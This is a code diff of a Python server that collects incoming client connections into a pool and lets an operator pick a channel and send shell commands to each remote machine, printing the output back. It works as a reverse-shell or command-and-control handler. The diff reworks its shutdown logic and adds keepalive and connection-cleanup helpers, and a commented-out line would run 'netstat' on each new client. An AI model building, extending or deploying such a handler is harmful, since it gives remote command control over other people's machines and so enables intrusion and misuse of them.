@@ -1,9 +1,11 @@
-import threading,sys,signal
+import threading,signal
+from time import sleep
 import socket ,subprocess
 from soc_fun import create_soc, send_recv,get_connection,isalive
 
 conn_pool = []
-thread_pool= ['t1','t2']
+thread_pool= ['t1','t2']        #this variable can be changed in the global space as its a mutable one
+SERVER_ALIVE = True
 # HOST='192.168.29.78'
 HOST=socket.gethostname()
 PORT=1234
@@ -27,13 +29,13 @@ class TerminalThread(threading.Thread):
         print("\t\tTerminal commands :- 'list' ,'connect <chanel ID>, grep <Ip Address>'quit'\n\t\tEnter 'list to get all the chanel IDs corresponding to ip connection\n")
         print('\t\t-------------------------------------------------------------------------------\n\n\n')
         while True:
-            tcmd = input('$>').strip().lower()
+            tcmd = input('\nShell>').strip().lower()
             try:
                 tcmd = tcmd.split()
                 if 'list' in tcmd and len(tcmd) == 1 :
                     self.get_pool()
                 elif len(tcmd) == 2 and 'grep' in tcmd:
-                    if self.check_ip(tcmd[1]):
+                    if _check_ip(tcmd[1]):
                         given_ip = tcmd[1].strip()
                         for i in conn_pool:
                             if i[1][0] == given_ip:
@@ -51,10 +53,8 @@ class TerminalThread(threading.Thread):
                         raise ValueError
 
                 elif 'quit' in tcmd and len(tcmd) == 1:
-                    # TODO need to redo the Exiting
-                    # closing all the connected socket
-                    for i in conn_pool:
-                        i[0].close()
+                    global SERVER_ALIVE          # need to refer global as it is outside the scope of this class
+                    SERVER_ALIVE = False         # if not then will reassing teh value agin in this scope ,and not changing it on global scope
                     exit(0)
 
                 else:
@@ -66,15 +66,28 @@ class TerminalThread(threading.Thread):
 
 class ConnectionThread(threading.Thread):
 
-    # extending and implementing one custome exit functionality to the Thread class
-
-    def handel(self,signum,frame):
-        # print("{:^100}".format('********* Exiting Server ************\n\n\n\n'))
-        raise OSError ("server Terminated ")
+    # Threading implemented by overwriding run() and adding a exit functionality
+    def run(self):
+        try:
+            self.so = create_soc(HOST,PORT)
+            while True:
+                conn,add = get_connection(self.so)
+                # s = send_recv(conn,'netstat -a -n')
+                # print(s)
+                conn_pool.append((conn,add))
+        except OSError:
+            print('connection error ... exiting ')
+            exit(0)
 
     def exit(self):
-        signal.signal(signal.SIGALRM,self.handel)
-        signal.alarm(1)
+        for i in conn_pool:
+            # i[0].shutdown(socket.SHUT_RDWR)
+            i[0].close()
+        self.so.shutdown(socket.SHUT_RDWR)              # Tearing down the connection and socet obj forecefully
+        print('shutdown')
+        self.so.close()
+        exit(0)
+
 
 
 
@@ -86,39 +99,40 @@ def _get_chanel(chanel_id):
     try:
 
         if isalive(conn):
-            print("{:^150}\n{}\nconnected to ip socket on {}".format('******This is an interactive terminal simulator shell*******','\t\t\t\tfile open commands and application oporation such as top is not available (WIP)',add))
+            print("{:^150}\n{}\nconnected to {} on {}".format('******This is an interactive terminal simulator shell*******','\t\t\t\tfile open commands and application oporation such as top is not available (WIP)',add[0],add[1]))
             while True:
-                cmd = input('~>')
+                cmd = input('@{}:{}>'.format(add[0],add[1]))
                 if cmd == 'exit':
                     return
                 if len(cmd) > 0:
                     client_msg =  send_recv(conn,cmd)
                     print(client_msg,end='')
                 elif len(cmd) == 0:
-                    client_dir = send_recv(conn,'pwd')
+                    client_dir = send_recv(conn,'\n')
                     print(client_dir , end='')
 
 
         else:
             print("unnable to connect . Thread dead")
-            temp = conn_pool.index(conn_pool[chanel_id])
-            conn_pool.pop(temp)
+            _remove_conn(conn_pool[chanel_id])
     except ValueError:
         print("unnable to connect . Thread dead")
-        temp = conn_pool.index(conn_pool[chanel_id])
-        conn_pool.pop(temp)
+        _remove_conn(conn_pool[chanel_id])
+    except BrokenPipeError:
+        print("unnable to connect . Thread dead")
+        _remove_conn(conn_pool[chanel_id])
 
 
 def _get_pool():
     # pulls and refresshes the connected hosts
     if len(conn_pool) > 0:
+        print('-----------connected Client list-------------\nIP\t\tPORT\t\tchannel ID')
         for i in conn_pool:
             conn ,add = i
             if isalive(conn):
-                print("Ip {} port {}  channel ID ::- {} ".format(add[0],add[1],conn_pool.index(i)))
+                print("{}\t{}\t\t{} ".format(add[0],add[1],conn_pool.index(i)))
             else:
-                temp = conn_pool.index(i)
-                conn_pool.pop(temp)
+                _remove_conn(i)
     else:
         print("No client conencted")
 
@@ -133,27 +147,28 @@ def _check_ip(ip):
     except ValueError:
         return False
 
-def main():
-    try:
-        so = create_soc(HOST,PORT)
-        while True:
-            conn,add = get_connection(so)
-            # s = send_recv(conn,'netstat -a -n')
-            # print(s)
-            conn_pool.append((conn,add))
-    except OSError:
-        print('connection error ... exiting ')
-        exit(0)
+def _remove_conn(element):
+    temp = conn_pool.index(element)
+    conn_pool.pop(temp)
+
+
+def _keepalive():
+    while SERVER_ALIVE:
+        sleep(6)
+        for e in conn_pool:
+            isalive(e[0])
+    return
 
 if __name__=="__main__":
 
     '''
         # TODO create another thread for keepalive .
     '''
-    thread_pool[0] = ConnectionThread(target=main)  # run in one
+    thread_pool[0] = ConnectionThread()  # run in one
     thread_pool[1] = TerminalThread(_get_pool,_get_chanel,_check_ip)
     thread_pool[0].start()
     thread_pool[1].start()
+    # _keepalive()
     thread_pool[1].join()
     print("{:^100}".format('********* Exiting Server ************\n\n\n\n'))
     thread_pool[0].exit()
